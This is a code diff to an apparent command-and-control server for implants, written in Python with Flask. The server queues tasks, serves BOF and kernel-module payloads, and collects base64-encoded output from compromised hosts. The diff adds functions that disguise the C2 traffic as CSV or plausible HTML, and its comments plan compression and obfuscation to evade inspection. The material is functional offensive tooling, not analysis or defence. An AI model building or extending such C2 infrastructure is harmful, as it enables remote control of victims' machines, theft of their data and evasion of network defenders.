@@ -7,6 +7,7 @@ import binascii
 from struct import pack, calcsize
 from collections import deque
 import secrets
+from enum import IntEnum
 
 """
 Tasking an implant to execute 'uname' BOF with '-r' arguemnt provided:
@@ -59,6 +60,12 @@ cmdData4 = {
 };
 """
 
+class ImplantMessageType(IntEnum):
+    GET_TASK = 1
+    GET_RESOURCE = 2
+    POST_RESULT = 3
+    UNKNOWN = 4
+
 app = Flask(__name__)
 
 CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"
@@ -87,6 +94,55 @@ TaskFifo = deque()
 InputDict = dict()
 OutputDict = dict()
 ErrorDict = dict()
+
+def netMasquerade(Task, MsgType):
+
+    if MsgType == ImplantMessageType.GET_TASK:
+
+        csvString = ""
+        for key, value in Task.items():
+            #if key == "header": 
+            #    value = value.replace(':', ',')
+
+            csvString += value + ','
+
+            print(csvString)
+
+        return csvString
+
+    elif MsgType == ImplantMessageType.GET_RESOURCE:
+        # in this case Task is a Flask 'Response' object
+        # https://flask.palletsprojects.com/en/stable/api/#flask.Response
+        # TODO: compress and base64 encode resources
+
+        return Task
+
+    elif MsgType == ImplantMessageType.POST_RESULT:
+        # TODO: return plausible HTML content
+
+        return Task
+
+    elif MsgType == ImplantMessageType.UNKNOWN:
+        # unrecognized request received
+        return "<p>no such site</p>"
+
+
+def netUnmasquerade(Task, MsgType):
+    if MsgType == ImplantMessageType.GET_TASK:
+        return Task
+
+    elif MsgType == ImplantMessageType.GET_RESOURCE:
+        return Task
+
+    elif MsgType == ImplantMessageType.POST_RESULT:
+        task_status_hdr = request.headers.get(OUTPUT_RESULT_STATUS_CODE_HEADER)
+        status_code = int(parseStatusCode(task_status_hdr))
+        taskID = request.headers.get(OUTPUT_RESULT_TASKID_HEADER)
+        if status_code == 0:
+            data = base64.b64decode(request.get_data())
+
+        return data, status_code, taskID
+
 
 @app.route("/")
 def main_page():
@@ -144,7 +200,7 @@ def addTask():
     str_out = ''.join(resp)
     return str_out
 
-def constructJSONInstruction(implant_identity):
+def constructImplantTask(implant_identity):
 
     arch, os = implant_identity.split(':')
     if arch == "x86_64":
@@ -275,58 +331,62 @@ def constructJSONInstruction(implant_identity):
     # return Implant's Instruction for execution
     return Instruction
 
-def masqueradeInstruction(Instruction):
-    csvString = ""
-    for key, value in Instruction.items():
-        #if key == "header": 
-        #    value = value.replace(':', ',')
 
-        csvString += value + ','
-
-    print(csvString)
-
-    return csvString
-
-# GET /endpoint - check if task is available
-# POST /endpoint - send in task's output data
+# GET /endpoint - check if task is available (GET_TASK handler)
+# POST /endpoint - send in task's output data (POST_RESULT handler)
 @app.route("/endpoint", methods=['GET', 'POST'])
 def heartbeat():
+    # Flask request:
+    # https://flask.palletsprojects.com/en/stable/api/#flask.Request
 
-    # get implant's output data and add it to the output's store under 'taskID' key
-    if request.method == 'POST':
-        task_status_hdr = request.headers.get(OUTPUT_RESULT_STATUS_CODE_HEADER)
-        status_code = int(parseStatusCode(task_status_hdr))
-        taskID = request.headers.get(OUTPUT_RESULT_TASKID_HEADER)
+    if request.method == 'GET':
+        msgType = ImplantMessageType.GET_TASK
+    elif request.method == 'POST':
+        msgType = ImplantMessageType.POST_RESULT
+    else:
+        msgType = ImplantMessageType.UNKNOWN
+
+    # get implant's output data and add it to the output's store under 'taskID' key (POST_RESULT handler)
+    if msgType == ImplantMessageType.POST_RESULT:
+        data, status_code, taskID = netUnmasquerade(request, msgType)
 
         if status_code == 0:
             data = base64.b64decode(request.get_data())
             OutputDict[taskID] = data
         else:
             ErrorDict[taskID] = status_code
+
         return ""
 
-    # abort, if there are no tasks to process
-    if len(TaskFifo) == 0:
-        return "nothing to do"
+    # GET_TASK handler
+    elif msgType == ImplantMessageType.GET_TASK:
+        # abort, if there are no tasks to process
+        if len(TaskFifo) == 0:
+            return "nothing to do"
 
-    # get implant's identification data encoded from (previously agreed) header
-    implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
-    if not implant_identity:
-        return "go away"
+        # get implant's identification data encoded from (previously agreed) header
+        implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
+        if not implant_identity:
+            return "go away"
 
-    implantInstruction = constructJSONInstruction(implant_identity)
+        # prepare task based on entry in the TaskFifo
+        implantTask = constructImplantTask(implant_identity)
 
-    return masqueradeInstruction(implantInstruction)
-
+        # format / mask / obsfuscate / encode task before sending
+        return netMasquerade(implantTask, ImplantMessageType.GET_TASK)
+    else:
+        return netMasquerade("", ImplantMessageType.UNKNOWN)
 
 
 @app.route(bofsRootDir + '<path:path>')
 def send_report(path):
-    return send_from_directory('bofs', path, mimetype='application/octet-stream')
+    resp = send_from_directory('bofs', path, mimetype='application/octet-stream')
+    return netMasquerade(resp, ImplantMessageType.GET_RESOURCE)
 
 @app.route(kmodsRootDir + '<path:path>')
 def send_kmod(path):
-    return send_from_directory('kmods', path, mimetype='application/octet-stream')
+    resp = send_from_directory('kmods', path, mimetype='application/octet-stream')
+    return netMasquerade(resp, ImplantMessageType.GET_RESOURCE)
 
 
 
